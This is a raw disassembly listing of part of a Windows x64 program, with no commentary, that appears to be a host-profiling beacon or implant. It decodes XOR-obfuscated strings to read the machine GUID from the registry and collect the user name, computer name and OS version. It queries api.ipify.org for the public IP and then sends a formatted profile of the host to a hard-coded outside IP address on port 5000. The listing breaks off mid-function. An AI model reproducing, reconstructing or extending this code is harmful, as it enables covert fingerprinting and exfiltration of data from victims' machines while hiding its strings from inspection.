   14000347b:	42 88 04 14          	mov    %al,(%rsp,%r10,1)
   14000347f:	42 02 04 0c          	add    (%rsp,%r9,1),%al
   140003483:	0f b6 c0             	movzbl %al,%eax
   140003486:	0f b6 04 04          	movzbl (%rsp,%rax,1),%eax
   14000348a:	41 30 00             	xor    %al,(%r8)
   14000348d:	49 83 c0 01          	add    $0x1,%r8
   140003491:	49 39 d8             	cmp    %rbx,%r8
   140003494:	75 c6                	jne    0x14000345c
   140003496:	48 8d 65 e8          	lea    -0x18(%rbp),%rsp
   14000349a:	5b                   	pop    %rbx
   14000349b:	5e                   	pop    %rsi
   14000349c:	5f                   	pop    %rdi
   14000349d:	5d                   	pop    %rbp
   14000349e:	c3                   	ret
   14000349f:	90                   	nop
   1400034a0:	55                   	push   %rbp
   1400034a1:	48 89 e5             	mov    %rsp,%rbp
   1400034a4:	41 57                	push   %r15
   1400034a6:	41 56                	push   %r14
   1400034a8:	41 55                	push   %r13
   1400034aa:	41 54                	push   %r12
   1400034ac:	57                   	push   %rdi
   1400034ad:	56                   	push   %rsi
   1400034ae:	53                   	push   %rbx
   1400034af:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
   1400034b3:	48 81 ec c0 03 00 00 	sub    $0x3c0,%rsp
   1400034ba:	48 8d 0d 3f 22 00 00 	lea    0x223f(%rip),%rcx        # 0x140005700
   1400034c1:	ff 15 71 5e 00 00    	call   *0x5e71(%rip)        # 0x140009338
   1400034c7:	48 85 c0             	test   %rax,%rax
   1400034ca:	0f 84 84 08 00 00    	je     0x140003d54
   1400034d0:	48 89 c3             	mov    %rax,%rbx
   1400034d3:	48 8d 15 76 21 00 00 	lea    0x2176(%rip),%rdx        # 0x140005650
   1400034da:	48 89 c1             	mov    %rax,%rcx
   1400034dd:	48 8b 3d 1c 5e 00 00 	mov    0x5e1c(%rip),%rdi        # 0x140009300
   1400034e4:	ff d7                	call   *%rdi
   1400034e6:	48 89 c6             	mov    %rax,%rsi
   1400034e9:	48 8d 15 70 21 00 00 	lea    0x2170(%rip),%rdx        # 0x140005660
   1400034f0:	48 89 d9             	mov    %rbx,%rcx
   1400034f3:	ff d7                	call   *%rdi
   1400034f5:	49 89 c4             	mov    %rax,%r12
   1400034f8:	48 8d 15 71 21 00 00 	lea    0x2171(%rip),%rdx        # 0x140005670
   1400034ff:	48 89 d9             	mov    %rbx,%rcx
   140003502:	ff d7                	call   *%rdi
   140003504:	49 89 c5             	mov    %rax,%r13
   140003507:	48 8d 15 82 21 00 00 	lea    0x2182(%rip),%rdx        # 0x140005690
   14000350e:	48 89 d9             	mov    %rbx,%rcx
   140003511:	ff d7                	call   *%rdi
   140003513:	49 89 c6             	mov    %rax,%r14
   140003516:	48 8d 15 93 21 00 00 	lea    0x2193(%rip),%rdx        # 0x1400056b0
   14000351d:	48 89 d9             	mov    %rbx,%rcx
   140003520:	ff d7                	call   *%rdi
   140003522:	49 89 c7             	mov    %rax,%r15
   140003525:	48 8d 15 a4 21 00 00 	lea    0x21a4(%rip),%rdx        # 0x1400056d0
   14000352c:	48 89 d9             	mov    %rbx,%rcx
   14000352f:	ff d7                	call   *%rdi
   140003531:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140003536:	48 8d 15 a3 21 00 00 	lea    0x21a3(%rip),%rdx        # 0x1400056e0
   14000353d:	48 89 d9             	mov    %rbx,%rcx
   140003540:	ff d7                	call   *%rdi
   140003542:	48 89 c3             	mov    %rax,%rbx
   140003545:	4d 85 e4             	test   %r12,%r12
   140003548:	0f 95 c0             	setne  %al
   14000354b:	48 85 f6             	test   %rsi,%rsi
   14000354e:	0f 95 c2             	setne  %dl
   140003551:	21 d0                	and    %edx,%eax
   140003553:	4d 85 ed             	test   %r13,%r13
   140003556:	0f 95 c2             	setne  %dl
   140003559:	21 d0                	and    %edx,%eax
   14000355b:	4d 85 f6             	test   %r14,%r14
   14000355e:	0f 95 c2             	setne  %dl
   140003561:	21 d0                	and    %edx,%eax
   140003563:	4d 85 ff             	test   %r15,%r15
   140003566:	0f 95 c2             	setne  %dl
   140003569:	21 d0                	and    %edx,%eax
   14000356b:	48 83 7c 24 58 00    	cmpq   $0x0,0x58(%rsp)
   140003571:	0f 95 c2             	setne  %dl
   140003574:	84 d0                	test   %dl,%al
   140003576:	0f 84 d8 07 00 00    	je     0x140003d54
   14000357c:	48 85 db             	test   %rbx,%rbx
   14000357f:	0f 84 cf 07 00 00    	je     0x140003d54
   140003585:	48 c7 84 24 70 03 00 	movq   $0x0,0x370(%rsp)
   14000358c:	00 00 00 00 00 
   140003591:	48 c7 84 24 78 03 00 	movq   $0x0,0x378(%rsp)
   140003598:	00 00 00 00 00 
   14000359d:	48 c7 84 24 80 03 00 	movq   $0x0,0x380(%rsp)
   1400035a4:	00 00 00 00 00 
   1400035a9:	48 c7 84 24 88 03 00 	movq   $0x0,0x388(%rsp)
   1400035b0:	00 00 00 00 00 
   1400035b5:	48 c7 84 24 90 03 00 	movq   $0x0,0x390(%rsp)
   1400035bc:	00 00 00 00 00 
   1400035c1:	48 c7 84 24 98 03 00 	movq   $0x0,0x398(%rsp)
   1400035c8:	00 00 00 00 00 
   1400035cd:	48 c7 84 24 a0 03 00 	movq   $0x0,0x3a0(%rsp)
   1400035d4:	00 00 00 00 00 
   1400035d9:	48 c7 84 24 a8 03 00 	movq   $0x0,0x3a8(%rsp)
   1400035e0:	00 00 00 00 00 
   1400035e5:	48 c7 84 24 30 03 00 	movq   $0x0,0x330(%rsp)
   1400035ec:	00 00 00 00 00 
   1400035f1:	48 c7 84 24 38 03 00 	movq   $0x0,0x338(%rsp)
   1400035f8:	00 00 00 00 00 
   1400035fd:	48 c7 84 24 40 03 00 	movq   $0x0,0x340(%rsp)
   140003604:	00 00 00 00 00 
   140003609:	48 c7 84 24 48 03 00 	movq   $0x0,0x348(%rsp)
   140003610:	00 00 00 00 00 
   140003615:	48 c7 84 24 50 03 00 	movq   $0x0,0x350(%rsp)
   14000361c:	00 00 00 00 00 
   140003621:	48 c7 84 24 58 03 00 	movq   $0x0,0x358(%rsp)
   140003628:	00 00 00 00 00 
   14000362d:	48 c7 84 24 60 03 00 	movq   $0x0,0x360(%rsp)
   140003634:	00 00 00 00 00 
   140003639:	48 c7 84 24 68 03 00 	movq   $0x0,0x368(%rsp)
   140003640:	00 00 00 00 00 
   140003645:	48 c7 84 24 10 03 00 	movq   $0x0,0x310(%rsp)
   14000364c:	00 00 00 00 00 
   140003651:	48 c7 84 24 18 03 00 	movq   $0x0,0x318(%rsp)
   140003658:	00 00 00 00 00 
   14000365d:	48 c7 84 24 20 03 00 	movq   $0x0,0x320(%rsp)
   140003664:	00 00 00 00 00 
   140003669:	48 c7 84 24 28 03 00 	movq   $0x0,0x328(%rsp)
   140003670:	00 00 00 00 00 
   140003675:	48 c7 84 24 f0 02 00 	movq   $0x0,0x2f0(%rsp)
   14000367c:	00 00 00 00 00 
   140003681:	48 c7 84 24 f8 02 00 	movq   $0x0,0x2f8(%rsp)
   140003688:	00 00 00 00 00 
   14000368d:	48 c7 84 24 00 03 00 	movq   $0x0,0x300(%rsp)
   140003694:	00 00 00 00 00 
   140003699:	48 c7 84 24 08 03 00 	movq   $0x0,0x308(%rsp)
   1400036a0:	00 00 00 00 00 
   1400036a5:	48 c7 84 24 b0 00 00 	movq   $0x0,0xb0(%rsp)
   1400036ac:	00 00 00 00 00 
   1400036b1:	48 c7 84 24 b8 00 00 	movq   $0x0,0xb8(%rsp)
   1400036b8:	00 00 00 00 00 
   1400036bd:	48 c7 84 24 c0 00 00 	movq   $0x0,0xc0(%rsp)
   1400036c4:	00 00 00 00 00 
   1400036c9:	48 c7 84 24 c8 00 00 	movq   $0x0,0xc8(%rsp)
   1400036d0:	00 00 00 00 00 
   1400036d5:	48 c7 84 24 d0 00 00 	movq   $0x0,0xd0(%rsp)
   1400036dc:	00 00 00 00 00 
   1400036e1:	48 c7 84 24 d8 00 00 	movq   $0x0,0xd8(%rsp)
   1400036e8:	00 00 00 00 00 
   1400036ed:	48 c7 84 24 80 00 00 	movq   $0x0,0x80(%rsp)
   1400036f4:	00 00 00 00 00 
   1400036f9:	48 c7 84 24 88 00 00 	movq   $0x0,0x88(%rsp)
   140003700:	00 00 00 00 00 
   140003705:	48 b8 f8 e4 ed ff fc 	movabs $0xeef9eafcffede4f8,%rax
   14000370c:	ea f9 ee 
   14000370f:	48 ba f7 e6 c2 c8 d9 	movabs $0xc4d8c4d9c8c2e6f7,%rdx
   140003716:	c4 d8 c4 
   140003719:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
   140003720:	00 
   140003721:	48 89 94 24 98 00 00 	mov    %rdx,0x98(%rsp)
   140003728:	00 
   140003729:	48 b8 cd df f7 e8 d9 	movabs $0xdfdbd2d9e8f7dfcd,%rax
   140003730:	d2 db df 
   140003733:	48 ba c4 cc d9 ca db 	movabs $0xd2c3dbcad9ccc4,%rdx
   14000373a:	c3 d2 00 
   14000373d:	48 89 84 24 a0 00 00 	mov    %rax,0xa0(%rsp)
   140003744:	00 
   140003745:	48 89 94 24 a8 00 00 	mov    %rdx,0xa8(%rsp)
   14000374c:	00 
   14000374d:	48 b8 e6 ca c8 c3 c2 	movabs $0xeccec5c2c3c8cae6,%rax
   140003754:	c5 ce ec 
   140003757:	48 89 44 24 74       	mov    %rax,0x74(%rsp)
   14000375c:	c7 44 24 7c de c2 cf 	movl   $0xcfc2de,0x7c(%rsp)
   140003763:	00 
   140003764:	b8 00 00 00 00       	mov    $0x0,%eax
   140003769:	0f b6 94 04 90 00 00 	movzbl 0x90(%rsp,%rax,1),%edx
   140003770:	00 
   140003771:	83 f2 ab             	xor    $0xffffffab,%edx
   140003774:	88 94 04 b0 00 00 00 	mov    %dl,0xb0(%rsp,%rax,1)
   14000377b:	48 83 c0 01          	add    $0x1,%rax
   14000377f:	48 83 f8 20          	cmp    $0x20,%rax
   140003783:	75 e4                	jne    0x140003769
   140003785:	b8 00 00 00 00       	mov    $0x0,%eax
   14000378a:	0f b6 54 04 74       	movzbl 0x74(%rsp,%rax,1),%edx
   14000378f:	83 f2 ab             	xor    $0xffffffab,%edx
   140003792:	88 94 04 80 00 00 00 	mov    %dl,0x80(%rsp,%rax,1)
   140003799:	48 83 c0 01          	add    $0x1,%rax
   14000379d:	48 83 f8 0b          	cmp    $0xb,%rax
   1400037a1:	75 e7                	jne    0x14000378a
   1400037a3:	48 c7 44 24 68 00 00 	movq   $0x0,0x68(%rsp)
   1400037aa:	00 00 
   1400037ac:	48 8d 94 24 b0 00 00 	lea    0xb0(%rsp),%rdx
   1400037b3:	00 
   1400037b4:	48 8d 44 24 68       	lea    0x68(%rsp),%rax
   1400037b9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400037be:	41 b9 01 01 00 00    	mov    $0x101,%r9d
   1400037c4:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   1400037ca:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   1400037d1:	ff 15 b1 5a 00 00    	call   *0x5ab1(%rip)        # 0x140009288
   1400037d7:	85 c0                	test   %eax,%eax
   1400037d9:	75 63                	jne    0x14000383e
   1400037db:	c7 84 24 e0 00 00 00 	movl   $0x40,0xe0(%rsp)
   1400037e2:	40 00 00 00 
   1400037e6:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   1400037ed:	00 
   1400037ee:	48 8d 84 24 e0 00 00 	lea    0xe0(%rsp),%rax
   1400037f5:	00 
   1400037f6:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400037fb:	48 8d 84 24 70 03 00 	lea    0x370(%rsp),%rax
   140003802:	00 
   140003803:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003808:	41 b9 00 00 00 00    	mov    $0x0,%r9d
   14000380e:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   140003814:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140003819:	ff 15 71 5a 00 00    	call   *0x5a71(%rip)        # 0x140009290
   14000381f:	89 c7                	mov    %eax,%edi
   140003821:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140003826:	ff 15 54 5a 00 00    	call   *0x5a54(%rip)        # 0x140009280
   14000382c:	85 ff                	test   %edi,%edi
   14000382e:	75 0e                	jne    0x14000383e
   140003830:	80 bc 24 70 03 00 00 	cmpb   $0x0,0x370(%rsp)
   140003837:	00 
   140003838:	0f 85 9e 00 00 00    	jne    0x1400038dc
   14000383e:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%rsp)
   140003845:	00 
   140003846:	48 8d bc 24 e0 00 00 	lea    0xe0(%rsp),%rdi
   14000384d:	00 
   14000384e:	b9 20 00 00 00       	mov    $0x20,%ecx
   140003853:	b8 00 00 00 00       	mov    $0x0,%eax
   140003858:	f3 48 ab             	rep stos %rax,(%rdi)
   14000385b:	c7 07 00 00 00 00    	movl   $0x0,(%rdi)
   140003861:	c7 44 24 64 04 01 00 	movl   $0x104,0x64(%rsp)
   140003868:	00 
   140003869:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   140003870:	00 
   140003871:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140003878:	00 00 
   14000387a:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   140003881:	00 00 
   140003883:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000388a:	00 00 
   14000388c:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   140003891:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   140003897:	ba 00 00 00 00       	mov    $0x0,%edx
   14000389c:	48 8d 0d 6d 17 00 00 	lea    0x176d(%rip),%rcx        # 0x140005010
   1400038a3:	ff 15 77 5a 00 00    	call   *0x5a77(%rip)        # 0x140009320
   1400038a9:	48 8d 54 24 64       	lea    0x64(%rsp),%rdx
   1400038ae:	48 8d bc 24 e0 00 00 	lea    0xe0(%rsp),%rdi
   1400038b5:	00 
   1400038b6:	48 89 f9             	mov    %rdi,%rcx
   1400038b9:	ff 15 19 5a 00 00    	call   *0x5a19(%rip)        # 0x1400092d8
   1400038bf:	48 8d 8c 24 70 03 00 	lea    0x370(%rsp),%rcx
   1400038c6:	00 
   1400038c7:	49 89 f9             	mov    %rdi,%r9
   1400038ca:	44 8b 44 24 60       	mov    0x60(%rsp),%r8d
   1400038cf:	48 8d 15 3e 17 00 00 	lea    0x173e(%rip),%rdx        # 0x140005014
   1400038d6:	ff 15 9c 5b 00 00    	call   *0x5b9c(%rip)        # 0x140009478
   1400038dc:	c7 84 24 ec 02 00 00 	movl   $0x40,0x2ec(%rsp)
   1400038e3:	40 00 00 00 
   1400038e7:	48 8d 94 24 ec 02 00 	lea    0x2ec(%rsp),%rdx
   1400038ee:	00 
   1400038ef:	48 8d 8c 24 30 03 00 	lea    0x330(%rsp),%rcx
   1400038f6:	00 
   1400038f7:	ff 15 7b 59 00 00    	call   *0x597b(%rip)        # 0x140009278
   1400038fd:	48 8d 0d 19 17 00 00 	lea    0x1719(%rip),%rcx        # 0x14000501d
   140003904:	ff 15 ee 59 00 00    	call   *0x59ee(%rip)        # 0x1400092f8
   14000390a:	48 85 c0             	test   %rax,%rax
   14000390d:	0f 84 52 04 00 00    	je     0x140003d65
   140003913:	48 8d 15 0d 17 00 00 	lea    0x170d(%rip),%rdx        # 0x140005027
   14000391a:	48 89 c1             	mov    %rax,%rcx
   14000391d:	ff 15 dd 59 00 00    	call   *0x59dd(%rip)        # 0x140009300
   140003923:	48 89 c2             	mov    %rax,%rdx
   140003926:	48 85 c0             	test   %rax,%rax
   140003929:	0f 84 36 04 00 00    	je     0x140003d65
   14000392f:	48 8d bc 24 e0 00 00 	lea    0xe0(%rsp),%rdi
   140003936:	00 
   140003937:	b9 22 00 00 00       	mov    $0x22,%ecx
   14000393c:	b8 00 00 00 00       	mov    $0x0,%eax
   140003941:	f3 48 ab             	rep stos %rax,(%rdi)
   140003944:	c7 07 00 00 00 00    	movl   $0x0,(%rdi)
   14000394a:	c7 84 24 e0 00 00 00 	movl   $0x114,0xe0(%rsp)
   140003951:	14 01 00 00 
   140003955:	48 8d 8c 24 e0 00 00 	lea    0xe0(%rsp),%rcx
   14000395c:	00 
   14000395d:	ff d2                	call   *%rdx
   14000395f:	85 c0                	test   %eax,%eax
   140003961:	0f 85 fe 03 00 00    	jne    0x140003d65
   140003967:	44 8b 84 24 e4 00 00 	mov    0xe4(%rsp),%r8d
   14000396e:	00 
   14000396f:	44 8b 8c 24 e8 00 00 	mov    0xe8(%rsp),%r9d
   140003976:	00 
   140003977:	8b 84 24 ec 00 00 00 	mov    0xec(%rsp),%eax
   14000397e:	45 85 c0             	test   %r8d,%r8d
   140003981:	0f 84 de 03 00 00    	je     0x140003d65
   140003987:	48 8d 8c 24 10 03 00 	lea    0x310(%rsp),%rcx
   14000398e:	00 
   14000398f:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140003993:	48 8d 15 9b 16 00 00 	lea    0x169b(%rip),%rdx        # 0x140005035
   14000399a:	ff 15 d8 5a 00 00    	call   *0x5ad8(%rip)        # 0x140009478
   1400039a0:	c6 84 24 f0 02 00 00 	movb   $0x3f,0x2f0(%rsp)
   1400039a7:	3f 
   1400039a8:	c6 84 24 f1 02 00 00 	movb   $0x0,0x2f1(%rsp)
   1400039af:	00 
   1400039b0:	48 c7 84 24 b0 00 00 	movq   $0x0,0xb0(%rsp)
   1400039b7:	00 00 00 00 00 
   1400039bc:	48 c7 84 24 b8 00 00 	movq   $0x0,0xb8(%rsp)
   1400039c3:	00 00 00 00 00 
   1400039c8:	48 b8 ca db c2 85 c2 	movabs $0xcdc2dbc285c2dbca,%rax
   1400039cf:	db c2 cd 
   1400039d2:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
   1400039d9:	00 
   1400039da:	48 b8 c2 cd d2 85 c4 	movabs $0xccd9c485d2cdc2,%rax
   1400039e1:	d9 cc 00 
   1400039e4:	48 89 84 24 96 00 00 	mov    %rax,0x96(%rsp)
   1400039eb:	00 
   1400039ec:	b8 00 00 00 00       	mov    $0x0,%eax
   1400039f1:	0f b6 94 04 90 00 00 	movzbl 0x90(%rsp,%rax,1),%edx
   1400039f8:	00 
   1400039f9:	83 f2 ab             	xor    $0xffffffab,%edx
   1400039fc:	88 94 04 b0 00 00 00 	mov    %dl,0xb0(%rsp,%rax,1)
   140003a03:	48 83 c0 01          	add    $0x1,%rax
   140003a07:	48 83 f8 0d          	cmp    $0xd,%rax
   140003a0b:	75 e4                	jne    0x1400039f1
   140003a0d:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140003a11:	0f 11 84 24 e0 00 00 	movups %xmm0,0xe0(%rsp)
   140003a18:	00 
   140003a19:	0f 11 84 24 f0 00 00 	movups %xmm0,0xf0(%rsp)
   140003a20:	00 
   140003a21:	b8 00 00 00 00       	mov    $0x0,%eax
   140003a26:	48 8d 8c 24 b0 00 00 	lea    0xb0(%rsp),%rcx
   140003a2d:	00 
   140003a2e:	0f b6 14 08          	movzbl (%rax,%rcx,1),%edx
   140003a32:	66 89 94 44 e0 00 00 	mov    %dx,0xe0(%rsp,%rax,2)
   140003a39:	00 
   140003a3a:	48 83 c0 01          	add    $0x1,%rax
   140003a3e:	48 83 f8 0d          	cmp    $0xd,%rax
   140003a42:	75 ea                	jne    0x140003a2e
   140003a44:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   140003a4b:	00 
   140003a4c:	41 b9 00 00 00 00    	mov    $0x0,%r9d
   140003a52:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   140003a58:	ba 01 00 00 00       	mov    $0x1,%edx
   140003a5d:	b9 00 00 00 00       	mov    $0x0,%ecx
   140003a62:	ff d6                	call   *%rsi
   140003a64:	48 89 c7             	mov    %rax,%rdi
   140003a67:	48 85 c0             	test   %rax,%rax
   140003a6a:	0f 84 f1 00 00 00    	je     0x140003b61
   140003a70:	48 8d 94 24 e0 00 00 	lea    0xe0(%rsp),%rdx
   140003a77:	00 
   140003a78:	41 b9 00 00 00 00    	mov    $0x0,%r9d
   140003a7e:	41 b8 bb 01 00 00    	mov    $0x1bb,%r8d
   140003a84:	48 89 c1             	mov    %rax,%rcx
   140003a87:	41 ff d4             	call   *%r12
   140003a8a:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140003a8f:	48 85 c0             	test   %rax,%rax
   140003a92:	0f 84 2f 03 00 00    	je     0x140003dc7
   140003a98:	c7 44 24 30 00 00 80 	movl   $0x800000,0x30(%rsp)
   140003a9f:	00 
   140003aa0:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   140003aa7:	00 00 
   140003aa9:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003ab0:	00 00 
   140003ab2:	41 b9 00 00 00 00    	mov    $0x0,%r9d
   140003ab8:	4c 8d 05 51 1c 00 00 	lea    0x1c51(%rip),%r8        # 0x140005710
   140003abf:	ba 00 00 00 00       	mov    $0x0,%edx
   140003ac4:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003ac9:	41 ff d5             	call   *%r13
   140003acc:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140003ad1:	48 85 c0             	test   %rax,%rax
   140003ad4:	0f 84 f7 02 00 00    	je     0x140003dd1
   140003ada:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140003ae1:	00 00 
   140003ae3:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140003aea:	00 
   140003aeb:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   140003af2:	00 
   140003af3:	41 b9 00 00 00 00    	mov    $0x0,%r9d
   140003af9:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   140003aff:	ba 00 00 00 00       	mov    $0x0,%edx
   140003b04:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140003b09:	41 ff d6             	call   *%r14
   140003b0c:	85 c0                	test   %eax,%eax
   140003b0e:	74 3e                	je     0x140003b4e
   140003b10:	ba 00 00 00 00       	mov    $0x0,%edx
   140003b15:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140003b1a:	41 ff d7             	call   *%r15
   140003b1d:	85 c0                	test   %eax,%eax
   140003b1f:	74 2d                	je     0x140003b4e
   140003b21:	c7 84 24 bc 03 00 00 	movl   $0x0,0x3bc(%rsp)
   140003b28:	00 00 00 00 
   140003b2c:	48 8d 94 24 f0 02 00 	lea    0x2f0(%rsp),%rdx
   140003b33:	00 
   140003b34:	4c 8d 8c 24 bc 03 00 	lea    0x3bc(%rsp),%r9
   140003b3b:	00 
   140003b3c:	41 b8 1f 00 00 00    	mov    $0x1f,%r8d
   140003b42:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140003b47:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   140003b4c:	ff d0                	call   *%rax
   140003b4e:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140003b53:	ff d3                	call   *%rbx
   140003b55:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003b5a:	ff d3                	call   *%rbx
   140003b5c:	48 89 f9             	mov    %rdi,%rcx
   140003b5f:	ff d3                	call   *%rbx
   140003b61:	48 c7 84 24 90 00 00 	movq   $0x0,0x90(%rsp)
   140003b68:	00 00 00 00 00 
   140003b6d:	48 c7 84 24 98 00 00 	movq   $0x0,0x98(%rsp)
   140003b74:	00 00 00 00 00 
   140003b79:	48 b8 99 9a 98 85 9a 	movabs $0x859e9d9a85989a99,%rax
   140003b80:	9d 9e 85 
   140003b83:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   140003b8a:	00 
   140003b8b:	48 b8 85 9f 9c 85 9a 	movabs $0x9c989a859c9f85,%rax
   140003b92:	98 9c 00 
   140003b95:	48 89 84 24 87 00 00 	mov    %rax,0x87(%rsp)
   140003b9c:	00 
   140003b9d:	b8 00 00 00 00       	mov    $0x0,%eax
   140003ba2:	0f b6 94 04 80 00 00 	movzbl 0x80(%rsp,%rax,1),%edx
   140003ba9:	00 
   140003baa:	83 f2 ab             	xor    $0xffffffab,%edx
   140003bad:	88 94 04 90 00 00 00 	mov    %dl,0x90(%rsp,%rax,1)
   140003bb4:	48 83 c0 01          	add    $0x1,%rax
   140003bb8:	48 83 f8 0e          	cmp    $0xe,%rax
   140003bbc:	75 e4                	jne    0x140003ba2
   140003bbe:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140003bc2:	0f 11 84 24 b0 00 00 	movups %xmm0,0xb0(%rsp)
   140003bc9:	00 
   140003bca:	0f 11 84 24 c0 00 00 	movups %xmm0,0xc0(%rsp)
   140003bd1:	00 
   140003bd2:	b8 00 00 00 00       	mov    $0x0,%eax
   140003bd7:	48 8d 8c 24 90 00 00 	lea    0x90(%rsp),%rcx
   140003bde:	00 
   140003bdf:	0f b6 14 08          	movzbl (%rax,%rcx,1),%edx
   140003be3:	66 89 94 44 b0 00 00 	mov    %dx,0xb0(%rsp,%rax,2)
   140003bea:	00 
   140003beb:	48 83 c0 01          	add    $0x1,%rax
   140003bef:	48 83 f8 0e          	cmp    $0xe,%rax
   140003bf3:	75 ea                	jne    0x140003bdf
   140003bf5:	48 8d bc 24 e0 00 00 	lea    0xe0(%rsp),%rdi
   140003bfc:	00 
   140003bfd:	b9 40 00 00 00       	mov    $0x40,%ecx
   140003c02:	b8 00 00 00 00       	mov    $0x0,%eax
   140003c07:	f3 48 ab             	rep stos %rax,(%rdi)
   140003c0a:	48 8d 8c 24 e0 00 00 	lea    0xe0(%rsp),%rcx
   140003c11:	00 
   140003c12:	48 8d 84 24 f0 02 00 	lea    0x2f0(%rsp),%rax
   140003c19:	00 
   140003c1a:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140003c1f:	48 8d 84 24 10 03 00 	lea    0x310(%rsp),%rax
   140003c26:	00 
   140003c27:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003c2c:	48 8d 84 24 30 03 00 	lea    0x330(%rsp),%rax
   140003c33:	00 
   140003c34:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003c39:	4c 8d 8c 24 70 03 00 	lea    0x370(%rsp),%r9
   140003c40:	00 
   140003c41:	4c 8d 05 e8 1a 00 00 	lea    0x1ae8(%rip),%r8        # 0x140005730
   140003c48:	48 8d 15 f2 13 00 00 	lea    0x13f2(%rip),%rdx        # 0x140005041
   140003c4f:	ff 15 23 58 00 00    	call   *0x5823(%rip)        # 0x140009478
   140003c55:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   140003c5c:	00 
   140003c5d:	41 b9 00 00 00 00    	mov    $0x0,%r9d
   140003c63:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   140003c69:	ba 01 00 00 00       	mov    $0x1,%edx
   140003c6e:	b9 00 00 00 00       	mov    $0x0,%ecx
   140003c73:	ff d6                	call   *%rsi
   140003c75:	48 89 c6             	mov    %rax,%rsi
   140003c78:	48 85 c0             	test   %rax,%rax
   140003c7b:	0f 84 d3 00 00 00    	je     0x140003d54
   140003c81:	48 8d 94 24 b0 00 00 	lea    0xb0(%rsp),%rdx
   140003c88:	00 
   140003c89:	41 b9 00 00 00 00    	mov    $0x0,%r9d
   140003c8f:	41 b8 88 13 00 00    	mov    $0x1388,%r8d
   140003c95:	48 89 c1             	mov    %rax,%rcx
   140003c98:	41 ff d4             	call   *%r12
   140003c9b:	48 89 c7             	mov    %rax,%rdi
   140003c9e:	48 85 c0             	test   %rax,%rax
   140003ca1:	0f 84 3b 01 00 00    	je     0x140003de2
   140003ca7:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140003cae:	00 
   140003caf:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   140003cb6:	00 00 
   140003cb8:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003cbf:	00 00 
   140003cc1:	41 b9 00 00 00 00    	mov    $0x0,%r9d
   140003cc7:	4c 8d 05 52 1a 00 00 	lea    0x1a52(%rip),%r8        # 0x140005720
   140003cce:	48 8d 15 6b 19 00 00 	lea    0x196b(%rip),%rdx        # 0x140005640
   140003cd5:	48 89 c1             	mov    %rax,%rcx
   140003cd8:	41 ff d5             	call   *%r13
   140003cdb:	49 89 c4             	mov    %rax,%r12
   140003cde:	48 85 c0             	test   %rax,%rax
   140003ce1:	0f 84 05 01 00 00    	je     0x140003dec
   140003ce7:	48 8d 84 24 e0 00 00 	lea    0xe0(%rsp),%rax
   140003cee:	00 
   140003cef:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140003cf4:	48 89 c1             	mov    %rax,%rcx
   140003cf7:	4c 8b 2d 92 56 00 00 	mov    0x5692(%rip),%r13        # 0x140009390
   140003cfe:	41 ff d5             	call   *%r13
   140003d01:	89 44 24 50          	mov    %eax,0x50(%rsp)
   140003d05:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140003d0a:	41 ff d5             	call   *%r13
   140003d0d:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140003d14:	00 00 
   140003d16:	8b 54 24 50          	mov    0x50(%rsp),%edx
   140003d1a:	89 54 24 28          	mov    %edx,0x28(%rsp)
   140003d1e:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140003d22:	4c 8b 4c 24 58       	mov    0x58(%rsp),%r9
   140003d27:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
   140003d2d:	48 8d 15 6c 18 00 00 	lea    0x186c(%rip),%rdx        # 0x1400055a0
   140003d34:	4c 89 e1             	mov    %r12,%rcx
